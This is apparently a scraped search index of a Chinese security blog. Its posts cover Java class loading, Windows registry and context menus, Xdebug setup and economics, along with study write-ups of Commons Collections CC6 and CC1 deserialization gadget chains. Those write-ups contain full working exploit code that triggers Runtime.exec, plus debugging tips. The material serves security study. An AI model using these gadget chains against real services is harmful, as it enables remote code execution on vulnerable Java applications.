因为双亲委派是向上委托加载的，所以它可以确保类只被加载一次。\n共享功能：一些framework层级的类一旦被顶层加载器加载，缓存在内存。在其他任何地方用到时，都遵守双亲加载机制，派发到顶层加载器因已经加载，所以都不需要重新加载，避免重复加载\n避免核心类被串改：Java的核心API都是通过引导类加载器进行加载的，如果别人通过定义同样路径的类比如java.lang.Integer，类加载器通过向上委托，两个Integer，那么最终被加载的应该是jdk的Integer类，而并非我们自定义的，这样就避免了我们恶意篡改核心包的风险\n隔离功能：保证核心类库的纯净和安全，防止恶意加载。\n优点1,2是由于只会加载一次，优点3,4是因为加载优先级是从父类到子类\n缺点 双亲委派模型的典型问题是加载 SPI 实现类的场景，比如 JNDI（Java Naming and Directory Interface，Java 命名与目录接口）服务。\n它的代码由启动类加载器去加载(在 JDK 1.3 时放进 rt.jar)，但 JNDI 的目的就是对资源进行集中管理和查找，它需要调用独立厂商实现部部署在应用程序的 classpath 下的 JNDI 接口提供者（SPI, Service Provider Interface）的代码，但启动类加载器不可能“认识”之些代码，这就双亲委派模型的问题，JDBC 也是同样的问题。\n参考链接 https://zhuanlan.zhihu.com/p/382020126\nhttps://blog.csdn.net/qq_21484461/article/details/131421264\nhttps://zhuanlan.zhihu.com/p/603047338\nhttps://frank909.blog.csdn.net/article/details/54973413\nhttps://www.cnblogs.com/hackerxian/p/10871667.html\n","date":"2024-11-06T14:52:13+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240807214918011.png","permalink":"https://d4n-sec.github.io/p/bytecodeanndloadclass/","title":"Java字节码与类加载器"},{"content":"最近其实学到的东西越来越多了，但是不知怎的，写文章的欲望却变得低迷了起来，不知是因为什么\n也许是因为其中部分知识算的上是已经学过了，如果重复写的话会感觉“浪费时间”吧\n但是写文章的初衷是怕忘记而非给谁谁看的不是吗\n也许人就是需要拧巴地过完一生吧\n","date":"2024-11-06T14:43:26+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241106180621486.png","permalink":"https://d4n-sec.github.io/p/feel_2024-11-06-14-43-11/","title":"24-11-06 有感"},{"content":"Windows 多级右键菜单基础 修改的键与项 Win10鼠标右键菜单管理分为三种情形：右键文件夹、文件以及右键空白区域\n右键空白区域（分为桌面空白区域和其他文件夹下空白区域） 右键文件夹 右键文件（分为所有文件和某类型文件两种） 绝大部分情况只需要关系HKEY_CLASSES_ROOT即可\n项：\nSubCommands：如果某键需要设置为拥有子菜单，那么需要SubCommands，如样例图2\nMUIVerb：显示的字符串\n键：\nshell：自定义的键需要在shell键下\ncommand：绑定exe，并对其传参\n关于传参 1 2 3 4 5 6 7 8 %0 //选中的单个文件的路径 %1 //选中的单个文件的路径 %2 //选中的单个文件的所在文件夹路径 %* //选中的所有文件的所有文件路径，空格分隔 %V //选中的若为快捷方式，则为目标路径，否则同%1 %n //选中的文件名（无扩展名） %x //选中的文件扩展名 %W //工作目录 %0和%1在对多个文件夹和单个文件夹选中右键时，表现均一致\n笔者环境为Win11\n在command设置为cmd.exe /c 1.bat %0时，\n有趣的是，选中多个文件夹右键点击时，传参是分别传递的，例如选中了文件夹a,b两个，会调用两次command里的内容，即执行两次command，分别为\ncmd.exe /c 1.bat a\ncmd.exe /c 1.bat b\n%*也是一样\n示例 样例：\n效果：\n点击后会调用指定的vbs文件，传参是 deletexxxx 和 %0\nvbs脚本内容如下\n1 2 3 4 5 6 7 8 9 10 11 strpass = \u0026#34;\u0026#34; For each i in WScript.Arguments strpass = strpass \u0026amp; \u0026#34; \u0026#34; \u0026amp; i Next \u0026#39; msgbox strpass Set WshShell = CreateObject(\u0026#34;WScript.Shell\u0026#34;) strPythonScript = \u0026#34;D:\\Users\\lidm11\\Code\\rightMenu\\fenfa.py\u0026#34; strCommand = \u0026#34;python.exe \u0026#34; \u0026amp; strPythonScript \u0026amp; \u0026#34; \u0026#34; \u0026amp; strpass \u0026#39; msgbox strCommand WshShell.Run strCommand, 0, true 第一段拼接获得的参数，第二段传递给python脚本静默执行\n脚本内容就根据传参灵活自定义了\n存档，脱敏的导出文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool] \u0026#34;MUIVerb\u0026#34;=\u0026#34;tools\u0026#34; \u0026#34;SubCommands\u0026#34;=\u0026#34;\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell] [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell\\Lidaming.deleteEmptyDir] \u0026#34;MUIVerb\u0026#34;=\u0026#34;递归清除空子文件夹\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell\\Lidaming.deleteEmptyDir\\command] @=\u0026#34;wscript.exe D:\\\\fenfa.vbs deleteEmptyDir %0\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell\\Lidaming.deleteEmptyFile] \u0026#34;MUIVerb\u0026#34;=\u0026#34;递归清除空文件\u0026#34; [HKEY_CLASSES_ROOT\\Directory\\shell\\Lidaming.tool\\shell\\Lidaming.deleteEmptyFile\\command] @=\u0026#34;wscript.exe D:\\\\fenfa.vbs deleteEmptyFile %0\u0026#34; ","date":"2024-10-17T16:09:39+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240914182009341.png","permalink":"https://d4n-sec.github.io/p/windowsrightmenu/","title":"Windows 右键菜单"},{"content":"Windows 注册表基础 Windows注册表的本质 官方描述\n注册表是一个分层数据库，其中包含对 Windows 的操作以及 Windows 上运行的应用程序和服务至关重要的数据。 数据以树格式进行结构化。 树中的每个节点称为 键。 每个键可以同时包含 子项 和数据条目（称为 值）。\n图解\n可以补充的是项类型\nREG_SZ：字符串：文本字符串\nREG_MULTI_SZ：多字符串值：含有多个文本值的字符串\nREG_BINARY：二进制数：二进制值，以十六进制显示，\nREG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值。\n如何打开 win+R打开运行，输入regedit，回车即可打开图形化界面\nCmd对注册表的基本操作 操作前建议备份，以便恢复\nreg add KeyName [/v EntryName|/ve] [/t DataType] [/s separator] [/d value] [/f] reg add将新的子项或项添加到注册表中\n示例：reg add \u0026quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\Advanced\\Folder\\Hidden\\SHOWALL\u0026quot; /v Checkedvalue /t reg_dword /d 1 /f\nKeyName：键路径\n/v：指定项-名称\n/t：指定项-类型\n/d：指定项-值\n/f：强制，无需询问\nreg delete KeyName [{/v EntryName|/ve|/va}] [/f] reg delete从注册表删除项或子项\n与reg add细节一致，有一些参数不同，最常用的如下\n/ve：指定只可以删除为空值的项\nreg query KeyName [{/v EntryName|/ve}] [/s] reg query返回注册表的子项下的项和下一层子项的列表\nreg compare KeyName1 KeyName2 [/v EntryName | /ve] {[/oa]|[/od]|[/os]|[on]} [/s] reg compare比较指定的注册表子项或项\nreg copy KeyName1 KeyName2 [/s] [/f] reg copy将一个注册表项复制到本地或远程计算机的指定位置\nreg export KeyName FileName reg export将指定子项、项和值的副本创建到文件中，以便将其传输到其它服务器\nreg import FileName reg import将包含导出的注册表子项、项和值的文件复制到本地计算机的注册表中\nreg load KeyName FileName reg load将保存的子项和项写回到注册表的不同子项中\nreg restore KeyName FileName reg restore将保存的子项和项写回到注册表\nreg save KeyName FileName reg save将指定的子项、项和注册表值的副本保存到指定文件中。\nreg unload KeyName reg unload使用reg load操作删除已加载的部分注册表\nTips HKEY_CLASSES_ROOT\\.3fr\\OpenWithProgids其实可以在命令行写作HKCR\\.3fr\\OpenWithProgids ","date":"2024-10-15T20:53:41+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241017160018161.png","permalink":"https://d4n-sec.github.io/p/windowsregeditbase/","title":"Windows 注册表基础"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #正式开始安装 sudo apt update sudo add-apt-repository ppa:ondrej/php sudo apt update sudo apt install apache2 sudo apt install --no-install-recommends php7.4 sudo apt-get install -y php7.4-cli php7.4-common php7.4-mysql php7.4-zip php7.4-gd php7.4-mbstring php7.4-curl php7.4-xml php7.4-bcmath php7.4-dev php7.4-fpm php -i 找xdebug # https://xdebug.org/wizard wget https://xdebug.org/files/xdebug-版本 tar -xvzf xdebug-版本.tgz cd xdebug-版本 phpize #确保和网上的一样 ./configure make #或者make \u0026amp;\u0026amp;sudo make install # 这个时候 modules 文件夹下已经有xdebug.so了 # 把他保存到一个路径短，且路径上没有-号的文件夹下 # 可用路径 /home/dan/xdebug/xdebug3.1.6/xdebug.so # 使用一个phpinfo();也可以找到，推荐phpinfo();虽然麻烦 php -i|grep \u0026#34;php.ini\u0026#34; #找到php.ini路径 #vim 编辑添加 [Xdebug] zend_extension = /home/dan/xdebug/xdebug3.1.6/xdebug.so xdebug.remote_enable=1 xdebug.remote_autostart=1 xdebug.remote_handler=dbgp xdebug.idekey=vscode xdebug.start_with_request=yes xdebug.mode = debug #;;特别注意这个地方是client_port，而xdebug2中是remote_port xdebug.client_host = 0.0.0.0 xdebug.client_port = 9383 #重启PHP服务 sudo service php版本-fpm restart sudo service apache2 restart #查看一下xdebug有没有 php -i （只能查看cli版本的） #使用一个phpinfo();确保apache版本的php.ini是否被修改;可以确保无误 #;断点，访问，成功 ","date":"2024-08-19T22:11:14+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240819221222949.png","permalink":"https://d4n-sec.github.io/p/devphpdebug/","title":"WSL2 PHP Xdebug 调试环境，安装速记"},{"content":"CC6链 CC6 Demo学习，以及踩坑记录\nCC6 Demo CC6能够解决CC1高版本无法利用的问题，先看看CC6链\n调用栈 1 2 3 4 5 6 7 8 9 10 11 12 13 /* Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */ 第8行到最后的链路我们已经熟悉了。\n所以简单来说，解决Java⾼版本利⽤问题，实际上就是在找上下⽂中是否还有其他调⽤LazyMap.get()的地⽅。\n如调用栈所示，可利用的类是org.apache.commons.collections.keyvalue.TiedMapEntry\nTiedMapEntry.getValue()中调⽤了this.map.get() ，⽽TiedMapEntry.hashCode()⽅法调⽤了TiedMapEntry.getValue()⽅法\nMap.hashCode()这个方法在URLDNS中就有过调用学习，那么，直接构造CC6链Demo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(697)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] } ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); 如上方代码所示，首先构造LazyMap，但是在构造的时候先传递一个无用的transformerChain，在最后即将进行序列化和反序列化前，通过反射的构造更换为真正的利用链即可。更换代码如下所示：\n1 2 3 Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); 然后再构造TiedMapEntry，TiedMapEntry没有无参构造，声明为public TiedMapEntry(Map map, Object key)。所以构造TiedMapEntry如下\n1 TiedMapEntry keyinner = new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;); 然后再构造HashMap，如下\n1 2 Map MMMap = new HashMap(); MMMap.put(keyinner,\u0026#34;TiedMapEntryInKey\u0026#34;); TiedMapEntry对象放在最外层HashMap()的Key值部分，为什么？因为HashMap.readObject()中只有如下语句调用了hash()，而传输对象是Key：\n1 2 3 4 5 6 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ... putVal(hash(key), key, value, false, false); ... } 在HashMap.hash()中，会屌用key.hashCode()，如下\n1 2 3 4 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } 所以HashMap反序列化对象时，Key应当为TiedMapEntry对象。\n目前的完整代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonC6dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(697)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] } ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry keyinner = new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;); Map MMMap = new HashMap(); MMMap.put(keyinner,\u0026#34;TiedMapEntryInKey\u0026#34;); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(MMMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 运行POC，发现无法RCE，为什么？\n踩坑指南 先不使用Debug模式，直接运行，也无法RCE\n无法RCE，此时将断点放在LazyMap.get()中的第一行。发现42行MMMap.put()的时候调用过LazyMap.get()，LazyMap.get()源码如下：\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 第一步会判断key值是否存在，如果不存在，会执行IF == true的内容，执行完后，map中就会保存一对儿Key，Value值。\n查看调用栈，发现是代码42行进行put触发的。这一步会把Map对象赋值，下次再次运行时，会发现Key值已经存在，于是跳过触发。\n解决办法就是将Map对象，在42行之后，清0或者删除42行put的key值。\n可以remove()和clear()，但是具体操作那个对象呢？\nMMMap是HashMap对象，里面有个TiedMapEntry对象keyinner，TiedMapEntry对象里包装的是LazyMap对象outerMap，LazyMap，即outerMap实际上只有一个内置Map是HashMap对象innerMap\n所以，outerMap，innerMap都可以。直接使用outerMap.clear();\n完整POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonC6dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(697)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] } ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry keyinner = new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;); Map MMMap = new HashMap(); MMMap.put(keyinner,\u0026#34;TiedMapEntryInKey\u0026#34;); outerMap.clear(); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(MMMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 直接运行，成功。\n结束了吗，没有。\n踩坑中的踩坑 如果你想对CC6的链路运行过程做Debug跟踪，看变量如何修改，程序如何调用，路径如何被劫持。\n恭喜你，有很强思考，验证和动手能力，但是你会发现，无法触发RCE。\n或者说，不使用断点的情况下，可以RCE，其他大多数情况下，LazyMap.get()总是无法做到IF == true。\n为什么？抛出结论，IDEA自动调用类的toString()，且不会触发断点。\n再且！！！\nTiedMapEntry.toString()中和TiedMapEntry.hashCode()一样，都会调用TiedMapEntry.getValue()，这里就是我们的利用链！！！！\n所以一旦IDEA尝试解析TiedMapEntry，去调用了TiedMapEntry.toString()，那么我们的利用链就会走一遍，map就会自动填充上一对Key =\u0026gt; Value，即使使用了outerMap.clear();，也不一定有效。\n证明一 第一步：直接断点LazyMap.get()，发现map.size == 0\n第二步：不需要步进步过，返回main函数看一眼，触发IDEA对TiedMapEntry.toString()自动调用\n第三步：回到LazyMap.get()，发现在没有步进步入的情况下，map有值了，size为1，不为0了\n此时再步入，也无法进入IF == true代码块了。\n证明二 断点在主函数43行，发现outerMap.clear()执行之前，outerMap.size == 1，按照逻辑来说，clear()之后size为0，步过运行，发现不变，连内容都没变。\n解释：因为main Debug途中，会对所有涉及变量做展示，其中包括keyinner这个TiedMapEntry对象，就会自动调用TiedMapEntry.toString()了。\n步过前：\n步过后：\n解决办法 修改代码\n1 2 3 TiedMapEntry keyinner = new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;); Map MMMap = new HashMap(); MMMap.put(keyinner,\u0026#34;TiedMapEntryInKey\u0026#34;); 为\n1 2 Map MMMap = new HashMap(); MMMap.put(new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;),\u0026#34;TiedMapEntryInKey\u0026#34;); 取消局部变量keyinner，就不会展示，也就不会触发，main函数纯步过可以Debug模式下RCE\n那如果要看TiedMapEntry里的运行流程呢？\n有如下方法理论上可以：\n关闭IDEA的自动toString() 针对这个org.apache.commons.collections.keyvalue.TiedMapEntry类进行设置，不做toString()处理 但实际上不行，笔者粗略的尝试了一次。\n以上\n","date":"2024-08-06T21:56:10+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240721160313033.png","permalink":"https://d4n-sec.github.io/p/cc6demo/","title":"CC6 Demo 学习"},{"content":" First of All 什么是教育\nEducation Is What Remains After You Have Forgotten Everything You Learned In School\n在你忘记所有你在学校中学到的知识后，剩下的东西，就是教育\n经济学十大原理 十大原理分成三类问题\nHow People Make Decisions（人们如何作出决策） How People Interact（人们如何相互影响/相互作用） How the Economy as a Whole Works（整体经济如何运行） 前两个问题属于微观经济学，第三个问题属于宏观经济学\n十大原理如下：\nPeople face tradeoffs（人们面临得失交换/权衡取舍） The cost of something is what you give up to get it.（某物的成本是为获得此物所放弃的东西） Rational people think at the margin.（理性人思考边际量，思考现象的导数，而不是本身） People respond to incentives.（人们会对激励/刺激作出反应） Trade can make everyone better off.（贸易能使人人收益） Markets are usually a good way to organize economic activity.（市场通常是组织经济活动的好方式） Governments can sometimes improve market outcomes.（政府有时可以改进市场结果） The standard of living depends on a country\u0026rsquo;s production.（一国的生活水平取决于它的生产） Prices rise when the governments prints too much money.（政府超发货币时，物价上涨） Society faces a short-run tradeoff between inflation and unemployment.（社会面临通货膨胀和失业之间的短期得失交换） 词记：\ntradeoffs：妥协，让步\nmargin：边际，边缘，界限\nincentives：刺激，激励\n","date":"2024-08-05T21:10:08+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240805211120995.png","permalink":"https://d4n-sec.github.io/p/ten-principles-of-economics/","title":"经济学十大原理"},{"content":"假设读者已经了解HashMap版非经典CC1链的构造原理。\n如此提到了非经典版的CC1链，代表经典版CC1链和HashMap版有一定出入。\n经典版CC1链使用的Map类为LazyMap而非HashMap\nLazyMap类的整体声明如下\n1 2 3 4 5 public class LazyMap extends AbstractMapDecorator implements Map, Serializable { ... } 整个Lazymap的transform()触发点只有在get()中有提到，get()方法的源代码如下\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 恰好，AnnotationInvocationHandler.invoke()有get()的调用\n1 2 3 4 5 6 public Object invoke(Object proxy, Method method, Object[] args) { ... // Handle annotation member accessors Object result = memberValues.get(member); ... } AnnotationInvocationHandler是一个继承了InvocationHandler接口的类，能够对某个对象进行代理，代理后被代理对象所以方法的触发都会被AnnotationInvocationHandler.invoke()拦截处理，恰如代理模式中动态代理的示例一般。\n有了这些Knowledge，我们就可以轻易理解如下示例\n简易经典版CC1链如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class ClassicCC1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); //获得代理对象 Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); //将代理对象赋值给memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } 39行修改TransformedMap为LazyMap\n41-49行获取代理对象\n53-54行，因为代理对象无法进行反序列化，需要一个可序列化类，成员变量可控并且readObject()中调用过成员变量的方法，该成员变量可接受代理类对象，条件严苛，刚好AnnotationInvocationHandler也满足这个条件\n如果存在一个类的成员变量可控并且readObject()中调用过成员变量的方法，该类可反序列化，那么同样也能触发\n下列是例子\n完整代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class ClassicCC1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // handler = (InvocationHandler) // construct.newInstance(Retention.class, proxyMap); ClassicCC cc = new ClassicCC(proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); // oos.writeObject(handler); oos.writeObject(cc); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } class ClassicCC implements Serializable { private Map\u0026lt;String, Object\u0026gt; mm; public ClassicCC(Map\u0026lt;String, Object\u0026gt; mm){ this.mm = mm; } private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); mm.clear(); } } 修改在55行和70-81行，第80行是触发函数。\n但是这种办法依旧没法在高版本Java中利用。\nLazyMap的漏洞触发在get和invoke中，完全没有setValue什么事，这也说明8u71后不能利用的原因和AnnotationInvocationHandler#readObject 中有没有setValue没任何关系（反驳某些文章不负责任的说法），关键还是和逻辑有关。\n最后，高版本的Java遇到CommonCollections，到底如何解决呢？继续学习吧！！\n","date":"2024-08-03T13:11:25+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240721160313033.png","permalink":"https://d4n-sec.github.io/p/javaclassiccc1/","title":"经典CC1链构造"},{"content":"代理模式 代理模式是常用的java设计模式。\n代理模式是常用的java设计模式，他的特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。简单的说就是，我们在访问实际对象时，是通过代理对象来访问的，代理模式就是在访问实际对象时引入一定程度的间接性，因为这种间接性，可以附加多种用途。\n实现分为静态代理和动态代理两种实现方式\n静态代理 简单来说代理模式就是将被代理类包装起来然后重新实现相同的方法，并且调用原来方法的同时可以在方法前后添加一个新的处理。而这种包装可以使用继承或者组合来使用。当我们调用的时候需要使用的是代理类的对象来调用而不是原来的被代理对象。\n通过继承实现 通过继承被代理对象，重写被代理方法，可以对其进行代理。\n优点：被代理类无需实现接口\n缺点：只能代理这个类，要想代理其他类，要想代理其他类需要写新的代理方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.dm.vulhub.Ser; public class Tank{ public void move() { System.out.println(\u0026#34;Tank moving cla....\u0026#34;); } public static void main(String[] args) { new ProxyTank().move(); } } class ProxyTank extends Tank{ @Override public void move() { System.out.println(\u0026#34;方法执行前...\u0026#34;); super.move(); System.out.println(\u0026#34;方法执行后...\u0026#34;); } } 通过组合实现 定义一个 Movable 